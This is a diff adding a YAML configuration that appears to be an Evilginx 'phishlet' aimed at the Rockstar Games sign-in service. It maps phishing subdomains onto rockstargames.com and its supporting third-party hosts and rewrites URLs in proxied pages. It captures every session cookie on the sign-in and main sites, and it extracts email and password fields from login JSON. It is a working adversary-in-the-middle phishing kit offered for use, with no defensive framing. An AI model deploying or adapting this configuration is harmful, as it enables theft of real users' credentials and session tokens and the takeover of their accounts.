@@ -1,0 +1,48 @@
+author: '@Evi1Grey5'
+min_ver: '3.0.0'
+
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'rockstargames.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'signin', orig_sub: 'signin', domain: 'rockstargames.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 's', orig_sub: 's', domain: 'rsg.sc', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'o432808.ngest', orig_sub: 'o432808', domain: 'sentry.io', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'cdn', orig_sub: 'cdn', domain: 'cookielaw.org', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'www1', orig_sub: 'www1', domain: 'recaptcha.net', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'www2', orig_sub: 'www2', domain: 'gstatic.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'media-rockstargames-com', orig_sub: 'media-rockstargames-com', domain: 'akamaized.net', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'graph', orig_sub: 'graph', domain: 'rockstargames.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'scapi', orig_sub: 'scapi', domain: 'rockstargames.com', session: true, is_landing: false, auto_filter: false}
+
+sub_filters:
+  - {triggers_on: 'signin.rockstargames.com', orig_sub: 'signin', domain: 'rockstargames.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'text/plain', 'text/css', 'font/woff2', 'application/x-javascript']}
+  - {triggers_on: 'signin.rockstargames.com', orig_sub: 'signin', domain: 'rockstargames.com', search: 'https://{hostname}/', replace: '{domain}', mimes: ['text/html', 'text/javascript', 'application/json', 'text/plain', 'text/css', 'font/woff2', 'application/x-javascript']}
+  - {triggers_on: 'www.rockstargames.com', orig_sub: 'www', domain: 'rockstargames.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'text/plain', 'text/css', 'font/woff2', 'application/x-javascript']}
+  - {triggers_on: 's.rsg.sc', orig_sub: 's', domain: 'rsg.sc', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'text/plain', 'text/css', 'font/woff2', 'application/x-javascript']}
+  - {triggers_on: 's.recaptcha.net', orig_sub: 'www1', domain: 'recaptcha.net', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'text/plain', 'text/css', 'font/woff2', 'application/x-javascript']}
+  - {triggers_on: 'cdn.cookielaw.org', orig_sub: 'cdn', domain: 'cookielaw.org', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'text/plain', 'text/css', 'font/woff2', 'application/x-javascript']}
+
+
+auth_tokens:
+  - domain: 'signin.rockstargames.com'
+    keys: ['.*,regexp']
+    type: 'cookie'
+  - domain: 'www.rockstargames.com'
+    keys: ['.*,regexp']
+    type: 'cookie'
+
+credentials:
+  username:
+    key: ''
+    search: '"email":"([^"]*)'
+    type: 'json'
+  password:
+    key: ''
+    search: '"password":"([^"]*)'
+    type: 'json'
+
+auth_urls:
+  - '/'
+
+login:
+  domain: 'signin.rockstargames.com'
+  path: '/signin/user-form?cid=rsg'
